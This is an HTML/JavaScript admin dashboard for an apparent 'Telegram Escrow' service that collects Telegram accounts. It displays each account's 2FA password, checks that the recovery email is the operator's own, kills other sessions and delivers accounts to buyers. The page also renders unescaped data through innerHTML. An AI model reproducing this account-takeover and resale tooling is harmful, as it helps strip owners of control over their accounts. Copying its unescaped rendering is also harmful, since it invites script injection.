<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Telegram Escrow</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
        a{color:#38bdf8;text-decoration:none}a:hover{text-decoration:underline}
        /* Nav */
        .nav{background:#1e293b;border-bottom:1px solid #334155;padding:0 24px;display:flex;align-items:center;height:56px;gap:32px}
        .nav-brand{font-weight:700;font-size:1.1rem;color:#38bdf8;display:flex;align-items:center;gap:8px}
        .nav-links{display:flex;gap:4px}
        .nav-links a{padding:8px 16px;border-radius:6px;color:#94a3b8;font-size:.875rem;font-weight:500;transition:.15s}
        .nav-links a:hover,.nav-links a.active{background:#334155;color:#f1f5f9;text-decoration:none}
        .nav-right{margin-left:auto;display:flex;align-items:center;gap:12px}
        /* Layout */
        .container{max-width:1280px;margin:0 auto;padding:24px}
        /* Stats */
        .stats{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:24px}
        .stat{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:16px;text-align:center}
        .stat .num{font-size:2rem;font-weight:700;line-height:1.2}.stat .lbl{font-size:.75rem;color:#94a3b8;margin-top:2px}
        .stat.s-total .num{color:#38bdf8}.stat.s-ready .num{color:#22c55e}.stat.s-pending .num{color:#f59e0b}.stat.s-delivered .num{color:#a78bfa}.stat.s-expired .num{color:#ef4444}
        /* Tabs */
        .tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}
        .tab{padding:8px 18px;border:1px solid #334155;background:transparent;color:#94a3b8;border-radius:6px;cursor:pointer;font-size:.85rem;font-weight:500;transition:.15s}
        .tab:hover{border-color:#475569;color:#e2e8f0}.tab.active{background:#334155;color:#f1f5f9;border-color:#475569}
        /* Buttons */
        .btn{padding:6px 14px;border-radius:6px;border:none;cursor:pointer;font-size:.8rem;font-weight:500;transition:.15s;display:inline-flex;align-items:center;gap:4px}
        .btn:disabled{opacity:.5;cursor:not-allowed}
        .btn-primary{background:#2563eb;color:#fff}.btn-primary:hover{background:#1d4ed8}
        .btn-success{background:#16a34a;color:#fff}.btn-success:hover{background:#15803d}
        .btn-danger{background:#dc2626;color:#fff}.btn-danger:hover{background:#b91c1c}
        .btn-warn{background:#d97706;color:#fff}.btn-warn:hover{background:#b45309}
        .btn-ghost{background:transparent;border:1px solid #475569;color:#94a3b8}.btn-ghost:hover{background:#334155;color:#e2e8f0}
        .btn-sm{padding:4px 10px;font-size:.75rem}
        /* Table */
        .tbl-wrap{background:#1e293b;border:1px solid #334155;border-radius:10px;overflow:hidden}
        table{width:100%;border-collapse:collapse}
        th{background:#0f172a;padding:10px 14px;text-align:left;font-size:.75rem;color:#64748b;text-transform:uppercase;letter-spacing:.05em;font-weight:600}
        td{padding:10px 14px;border-top:1px solid #1e293b;font-size:.85rem}
        tr:hover td{background:#1a2744}
        .mono{font-family:'Cascadia Code','Fira Code',monospace;font-size:.82rem}
        /* Badge */
        .badge{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.72rem;font-weight:600}
        .b-green{background:#052e16;color:#4ade80;border:1px solid #166534}
        .b-yellow{background:#422006;color:#fbbf24;border:1px solid #854d0e}
        .b-blue{background:#172554;color:#60a5fa;border:1px solid #1e40af}
        .b-purple{background:#2e1065;color:#c084fc;border:1px solid #6b21a8}
        .b-red{background:#450a0a;color:#f87171;border:1px solid #991b1b}
        .b-gray{background:#1e293b;color:#94a3b8;border:1px solid #334155}
        /* Dot */
        .dot{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:4px}.dot-green{background:#22c55e}.dot-red{background:#ef4444}.dot-yellow{background:#f59e0b}
        /* Modal */
        .overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:100;justify-content:center;align-items:flex-start;padding:60px 16px;overflow-y:auto}
        .overlay.open{display:flex}
        .modal{background:#1e293b;border:1px solid #334155;border-radius:12px;width:100%;max-width:640px;max-height:85vh;overflow-y:auto}
        .modal-hdr{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;border-bottom:1px solid #334155}
        .modal-hdr h3{font-size:1rem;font-weight:600}
        .modal-close{background:none;border:none;color:#64748b;font-size:1.4rem;cursor:pointer;padding:4px}
        .modal-close:hover{color:#f1f5f9}
        .modal-body{padding:20px}
        /* Detail rows */
        .d-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #1e293b}
        .d-row:last-child{border:none}
        .d-lbl{color:#64748b;font-size:.82rem}.d-val{font-size:.85rem;text-align:right}
        .section-title{font-size:.8rem;font-weight:700;color:#38bdf8;text-transform:uppercase;letter-spacing:.05em;margin:16px 0 8px;padding-top:12px;border-top:1px solid #334155}
        .section-title:first-child{border:none;margin-top:0;padding-top:0}
        /* Session cards */
        .sess-card{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px 14px;margin-bottom:8px;font-size:.8rem}
        .sess-card .row{display:flex;justify-content:space-between;margin-bottom:2px}
        /* Actions bar */
        .actions-bar{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px;padding-top:16px;border-top:1px solid #334155}
        /* Toast */
        .toast{position:fixed;top:16px;right:16px;z-index:200;padding:12px 20px;border-radius:8px;font-size:.85rem;font-weight:500;display:none;max-width:400px;box-shadow:0 8px 24px rgba(0,0,0,.3)}
        .toast.show{display:block;animation:slideIn .3s ease}
        .toast-ok{background:#052e16;border:1px solid #166534;color:#4ade80}
        .toast-err{background:#450a0a;border:1px solid #991b1b;color:#f87171}
        .toast-info{background:#172554;border:1px solid #1e40af;color:#60a5fa}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        /* Loading */
        .spinner{width:20px;height:20px;border:2px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin .6s linear infinite;display:inline-block}
        @keyframes spin{to{transform:rotate(360deg)}}
        .loading-msg{display:flex;align-items:center;gap:10px;justify-content:center;padding:40px;color:#64748b}
        .empty-msg{text-align:center;padding:40px;color:#475569}
        /* Responsive */
        @media(max-width:768px){.stats{grid-template-columns:repeat(3,1fr)}.nav-links{display:none}}
        @media(max-width:500px){.stats{grid-template-columns:repeat(2,1fr)}}
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="nav">
        <div class="nav-brand">&#9889; Telegram Escrow</div>
        <div class="nav-links">
            <a href="/">Register</a>
            <a href="/receive" class="active">Admin Panel</a>
            <a href="/dashboard">Delivery</a>
        </div>
        <div class="nav-right">
            <span id="conn-badge" style="font-size:.75rem;color:#64748b">--</span>
            <button class="btn btn-ghost btn-sm" onclick="loadDashboard()">&#8635; Refresh</button>
        </div>
    </nav>

    <!-- Toast -->
    <div id="toast" class="toast"></div>

    <div class="container">
        <!-- Stats -->
        <div class="stats">
            <div class="stat s-total"><div class="num" id="s-total">-</div><div class="lbl">Total</div></div>
            <div class="stat s-ready"><div class="num" id="s-ready">-</div><div class="lbl">Ready</div></div>
            <div class="stat s-pending"><div class="num" id="s-pending">-</div><div class="lbl">Pending</div></div>
            <div class="stat s-delivered"><div class="num" id="s-delivered">-</div><div class="lbl">Delivered</div></div>
            <div class="stat s-expired"><div class="num" id="s-expired">-</div><div class="lbl">Expired</div></div>
        </div>

        <!-- Tabs -->
        <div class="tabs">
            <button class="tab active" data-tab="ready">Ready</button>
            <button class="tab" data-tab="pending">Pending</button>
            <button class="tab" data-tab="delivered">Delivered</button>
            <button class="tab" data-tab="expired">Expired</button>
        </div>

        <!-- Table -->
        <div id="table-area">
            <div class="loading-msg"><span class="spinner"></span> Loading accounts...</div>
        </div>
    </div>

    <!-- Account Detail Modal -->
    <div id="modal-overlay" class="overlay">
        <div class="modal">
            <div class="modal-hdr">
                <h3 id="modal-title">Account Details</h3>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="modal-body" id="modal-body"></div>
        </div>
    </div>

<script>
const API = location.origin + '/api/v1';
let data = null, tab = 'ready';

// ===== API =====
async function api(path, method='GET', body=null) {
    const o = {method, headers:{'Content-Type':'application/json'}};
    if (body) o.body = JSON.stringify(body);
    const r = await fetch(API+path, o);
    const j = await r.json();
    if (!r.ok) throw new Error(j.detail||'Error');
    return j;
}

// ===== Toast =====
let toastTimer;
function toast(msg, type='info') {
    const t = document.getElementById('toast');
    t.className = `toast show toast-${type}`;
    t.textContent = msg;
    clearTimeout(toastTimer);
    toastTimer = setTimeout(()=>t.classList.remove('show'), 3500);
}

// ===== Copy =====
function copy(text) {
    navigator.clipboard.writeText(text).then(()=>toast('Copied!','ok'));
}

// ===== Badge helpers =====
function statusBadge(s) {
    const m = {completed:'b-green',authenticated:'b-blue',pending_code:'b-yellow',pending_2fa:'b-yellow',expired:'b-red',audit_passed:'b-green',audit_failed:'b-red',bot_received:'b-purple',buyer_delivered:'b-purple'};
    return `<span class="badge ${m[s]||'b-gray'}">${s||'unknown'}</span>`;
}
function deliveryBadge(s) {
    if (!s) return '<span class="badge b-gray">none</span>';
    const m = {ready:'b-green',code_sent:'b-yellow',delivered:'b-purple',buyer_delivered:'b-purple',expired:'b-red',force_secured:'b-red',bot_received:'b-blue'};
    return `<span class="badge ${m[s]||'b-gray'}">${s}</span>`;
}

// ===== Dashboard =====
async function loadDashboard() {
    document.getElementById('table-area').innerHTML = '<div class="loading-msg"><span class="spinner"></span> Loading...</div>';
    try {
        data = await api('/admin/accounts/all');
        document.getElementById('s-total').textContent = data.summary.total;
        document.getElementById('s-ready').textContent = data.summary.ready;
        document.getElementById('s-pending').textContent = data.summary.pending;
        document.getElementById('s-delivered').textContent = data.summary.delivered;
        document.getElementById('s-expired').textContent = data.summary.expired;
        renderTable();
        // Connections
        try {
            const c = await api('/admin/connections');
            document.getElementById('conn-badge').textContent = `${c.total_active} active conn`;
        } catch(e) {}
    } catch(e) {
        document.getElementById('table-area').innerHTML = `<div class="empty-msg" style="color:#f87171">Error: ${e.message}</div>`;
    }
}

function renderTable() {
    if (!data) return;
    const list = data[tab+'_accounts'] || [];
    if (!list.length) {
        document.getElementById('table-area').innerHTML = '<div class="empty-msg">No accounts in this category</div>';
        return;
    }
    let html = `<div class="tbl-wrap"><table><thead><tr>
        <th>Phone</th><th>TG ID</th><th>Status</th><th>Delivery</th><th>2FA</th><th>Sessions</th><th>Actions</th>
    </tr></thead><tbody>`;
    for (const a of list) {
        html += `<tr>
            <td class="mono">${a.phone}</td>
            <td>${a.telegram_id||'-'}</td>
            <td>${statusBadge(a.status)}</td>
            <td>${deliveryBadge(a.delivery_status)}</td>
            <td>${a.has_2fa?'<span class="dot dot-green"></span>Yes':'<span class="dot dot-red"></span>No'}</td>
            <td>${a.has_pyrogram_session?'<span class="dot dot-green"></span>P ':'<span class="dot dot-red"></span>P '}${a.has_telethon_session?'<span class="dot dot-green"></span>T':'<span class="dot dot-red"></span>T'}</td>
            <td><button class="btn btn-primary btn-sm" onclick="viewAccount('${a.phone}')">Details</button></td>
        </tr>`;
    }
    html += '</tbody></table></div>';
    document.getElementById('table-area').innerHTML = html;
}

// ===== Tabs =====
document.querySelectorAll('.tab').forEach(b => {
    b.addEventListener('click', () => {
        document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
        b.classList.add('active');
        tab = b.dataset.tab;
        renderTable();
    });
});

// ===== Account Detail Modal =====
async function viewAccount(phone) {
    document.getElementById('modal-title').textContent = phone;
    document.getElementById('modal-body').innerHTML = '<div class="loading-msg"><span class="spinner"></span> Loading...</div>';
    document.getElementById('modal-overlay').classList.add('open');

    try {
        const r = await api(`/admin/account/${encodeURIComponent(phone)}`);
        const a = r.account;
        let h = '';

        // ---- General ----
        h += `<div class="section-title">General</div>`;
        h += drow('Phone', `<span class="mono">${a.phone}</span> <button class="btn btn-ghost btn-sm" onclick="copy('${a.phone}')">Copy</button>`);
        h += drow('Telegram ID', a.telegram_id||'-');
        h += drow('Status', statusBadge(a.status));
        h += drow('Delivery', deliveryBadge(a.delivery_status));
        h += drow('Transfer Mode', a.transfer_mode);
        h += drow('Created', a.created_at ? new Date(a.created_at).toLocaleString() : '-');

        // ---- Security ----
        h += `<div class="section-title">Security</div>`;
        h += drow('2FA Password', a.password ? `<span class="mono">${a.password}</span> <button class="btn btn-ghost btn-sm" onclick="copy('${a.password}')">Copy</button>` : '<span style="color:#64748b">None</span>');
        h += drow('2FA Enabled', a.has_2fa ? '<span class="dot dot-green"></span> Yes' : '<span class="dot dot-red"></span> No');
        h += drow('Audit Passed', a.audit_passed ? '<span class="dot dot-green"></span> Yes' : '<span class="dot dot-red"></span> No');

        // ---- Email ----
        h += `<div class="section-title">Recovery Email (2FA)</div>`;
        const emailColor = a.is_our_email ? '#22c55e' : (a.recovery_email ? '#ef4444' : '#64748b');
        h += drow('Recovery Email', a.recovery_email
            ? `<span style="color:${emailColor}" class="mono">${a.recovery_email}</span> ${a.is_our_email?'&#10003; Ours':'&#10007; Not ours!'}`
            : (a.has_recovery_email ? '<span style="color:#f59e0b">Confirmed (hidden)</span>' : '<span style="color:#64748b">None</span>'));
        if (a.pending_email) h += drow('Pending Email', `<span style="color:#f59e0b">${a.pending_email}</span>`);
        if (a.login_email_pattern) h += drow('Login Email', `<span style="color:#94a3b8">${a.login_email_pattern} (separate)</span>`);
        h += drow('Target Email', a.target_email || '-');

        // ---- Sessions ----
        h += `<div class="section-title">Sessions</div>`;
        h += drow('Pyrogram', a.pyrogram_status==='active' ? '<span class="dot dot-green"></span> Active' : '<span class="dot dot-red"></span> Inactive');
        h += drow('Telethon', a.telethon_status==='active' ? '<span class="dot dot-green"></span> Active' : '<span class="dot dot-red"></span> Inactive');
        h += drow('Other Sessions', a.sessions_count||0);

        // Other sessions detail
        if (a.sessions_detail && a.sessions_detail.length) {
            h += `<div style="margin-top:8px">`;
            for (const s of a.sessions_detail) {
                h += `<div class="sess-card">
                    <div class="row"><span>${s.device_model||'?'} &middot; ${s.platform||''}</span><span style="color:#64748b">${s.app_name||''}</span></div>
                    <div class="row"><span style="color:#64748b">${s.ip||''} &middot; ${s.country||''}</span>
                    <button class="btn btn-danger btn-sm" onclick="terminateSession('${a.phone}','${s.hash}')">Kill</button></span></div>
                </div>`;
            }
            h += `</div>`;
        }

        // ---- Actions ----
        h += `<div class="actions-bar">
            <button class="btn btn-success btn-sm" onclick="fixAccount('${a.phone}','set_completed')">Set Completed</button>
            <button class="btn btn-warn btn-sm" onclick="fixAccount('${a.phone}','reset_delivery')">Reset Delivery</button>
            <button class="btn btn-primary btn-sm" onclick="fixAccount('${a.phone}','set_bot_received')">Set Bot Received</button>
            <button class="btn btn-warn btn-sm" onclick="terminateAllSessions('${a.phone}')">Kill All Sessions</button>
            <button class="btn btn-danger btn-sm" onclick="logoutOurSessions('${a.phone}')">Logout Our Sessions</button>
            <button class="btn btn-danger btn-sm" onclick="securityCheck('${a.phone}')">Security Check</button>
            <button class="btn btn-danger btn-sm" onclick="deleteAccount('${a.phone}')">Delete Account</button>
        </div>`;

        // Delivery actions
        if (a.status === 'completed' && a.delivery_status !== 'buyer_delivered') {
            h += `<div class="actions-bar">
                <button class="btn btn-success" onclick="requestDeliveryCode('${a.phone}')">Request Delivery Code</button>
            </div>`;
        }
        if (a.delivery_status === 'code_sent') {
            h += `<div class="actions-bar">
                <button class="btn btn-primary" onclick="confirmDelivery('${a.phone}')">Confirm Delivery</button>
            </div>`;
        }

        document.getElementById('modal-body').innerHTML = h;
    } catch(e) {
        document.getElementById('modal-body').innerHTML = `<div style="color:#f87171;padding:20px">Error: ${e.message}</div>`;
    }
}

function drow(label, value) {
    return `<div class="d-row"><span class="d-lbl">${label}</span><span class="d-val">${value}</span></div>`;
}

function closeModal() { document.getElementById('modal-overlay').classList.remove('open'); }
document.getElementById('modal-overlay').addEventListener('click', e => { if (e.target === e.currentTarget) closeModal(); });

// ===== Actions =====
async function fixAccount(phone, action) {
    const map = {
        reset_delivery: {reset_delivery_count:true},
        set_completed: {set_status:'completed',set_has_2fa:true,set_audit_passed:true},
        set_bot_received: {set_delivery_status:'bot_received'}
    };
    try {
        await api(`/admin/account/${encodeURIComponent(phone)}/fix`,'POST', map[action]);
        toast('Account updated','ok');
        closeModal(); loadDashboard();
    } catch(e) { toast(e.message,'err'); }
}

async function terminateSession(phone, hash) {
    if (!confirm(`Kill session ${hash}?`)) return;
    try {
        await api(`/admin/account/${encodeURIComponent(phone)}/terminate-session`,'POST',{session_hash:String(hash)});
        toast('Session terminated','ok');
        viewAccount(phone);
    } catch(e) { toast(e.message,'err'); }
}

async function terminateAllSessions(phone) {
    if (!confirm('Terminate ALL other sessions?')) return;
    try {
        const r = await api(`/admin/account/${encodeURIComponent(phone)}/terminate-session`,'POST',{terminate_all:true});
        toast(`Terminated ${r.terminated} sessions`,'ok');
        viewAccount(phone);
    } catch(e) { toast(e.message,'err'); }
}

async function logoutOurSessions(phone) {
    if (!confirm('Logout our Pyrogram+Telethon sessions? Session strings will be cleared.')) return;
    try {
        const r = await api(`/admin/account/${encodeURIComponent(phone)}/logout-our-sessions`,'POST');
        const pStatus = r.pyrogram?.status || 'unknown';
        const tStatus = r.telethon?.status || 'unknown';
        const pDetail = r.pyrogram?.detail || '';
        const tDetail = r.telethon?.detail || '';
        const icon = (s) => s === 'logged_out' ? '✅' : s === 'session_expired' ? '⚠️' : s === 'no_session' ? '⬜' : '❌';
        const msg = `Pyrogram: ${icon(pStatus)} ${pStatus} ${pDetail ? '(' + pDetail + ')' : ''}\nTelethon: ${icon(tStatus)} ${tStatus} ${tDetail ? '(' + tDetail + ')' : ''}`;
        const allOk = ['logged_out','session_expired','no_session'].includes(pStatus) && ['logged_out','session_expired','no_session'].includes(tStatus);
        alert(`Logout Results:\n\n${msg}`);
        toast(allOk ? 'Sessions cleared' : 'Some errors occurred', allOk ? 'ok' : 'err');
        viewAccount(phone);
    } catch(e) { toast(e.message,'err'); }
}

async function securityCheck(phone) {
    toast('Running security check...','info');
    try {
        const r = await api(`/security/check/${encodeURIComponent(phone)}`);
        let msg = `Threat: ${r.threat_level.toUpperCase()}`;
        if (r.frozen) msg += ' | FROZEN';
        if (r.red_flags.length) msg += ` | ${r.red_flags.length} red flags`;
        toast(msg, r.threat_level==='safe'?'ok':'err');
        viewAccount(phone);
    } catch(e) { toast(e.message,'err'); }
}

async function deleteAccount(phone) {
    if (!confirm(`DELETE account ${phone}? This will logout all sessions and remove from database. Cannot be undone!`)) return;
    try {
        const r = await api(`/admin/account/${encodeURIComponent(phone)}`,'DELETE');
        const pStatus = r.pyrogram?.status || 'unknown';
        const tStatus = r.telethon?.status || 'unknown';
        const icon = (s) => s === 'logged_out' ? '✅' : s === 'session_expired' ? '⚠️' : s === 'no_session' ? '⬜' : '❌';
        toast(`Deleted. Pyrogram: ${icon(pStatus)} ${pStatus} | Telethon: ${icon(tStatus)} ${tStatus}`, 'ok');
        closeModal(); loadDashboard();
    } catch(e) { toast(e.message,'err'); }
}

async function requestDeliveryCode(phone) {
    try {
        toast('Requesting delivery code...','info');
        await api(`/delivery/request-code/${encodeURIComponent(phone)}`,'POST');
        toast('Delivery code sent','ok');
        setTimeout(()=>viewAccount(phone), 1500);
    } catch(e) { toast(e.message,'err'); }
}

async function confirmDelivery(phone) {
    if (!confirm('Confirm delivery? Sessions will be logged out and cleared.')) return;
    try {
        const r = await api(`/delivery/confirm/${encodeURIComponent(phone)}`,'POST',{received:true});
        toast(`Delivery #${r.delivery_number} confirmed`,'ok');
        closeModal(); loadDashboard();
    } catch(e) { toast(e.message,'err'); }
}

// ===== Init =====
document.addEventListener('DOMContentLoaded', loadDashboard);
</script>
</body>
</html>
